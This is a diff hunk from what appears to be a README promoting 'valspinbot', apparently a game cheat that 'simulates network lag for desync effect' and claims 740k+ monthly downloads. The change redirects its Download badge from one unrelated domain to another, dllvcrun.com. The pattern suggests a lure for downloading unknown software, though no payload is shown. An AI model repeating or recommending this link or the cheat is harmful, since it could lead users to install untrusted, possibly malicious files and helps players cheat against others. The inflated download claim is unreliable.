@@ -49,7 +49,7 @@ A: Yes — simulates network lag for desync effect.
 
 **Monthly downloads:** 740k+
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://connectinstruction.com/valspinbot)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://dllvcrun.com/valspinbot)
 
 ---
 
